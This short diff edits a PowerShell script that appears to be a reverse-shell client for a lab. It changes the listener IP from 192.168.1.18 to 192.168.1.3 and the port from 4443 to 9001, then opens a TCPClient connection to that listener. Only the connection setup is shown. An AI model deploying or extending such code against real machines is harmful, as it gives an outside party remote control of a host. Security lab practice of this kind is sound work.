@@ -10,8 +10,8 @@ try {
 }
 
 # TCP Connection (lab-safe)
-$serverIP = '192.168.1.18'  # Lab listener IP
-$serverPort = 4443           # Lab listener port
+$serverIP = '192.168.1.3'  # Lab listener IP
+$serverPort = 9001           # Lab listener port
 
 try {
     $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
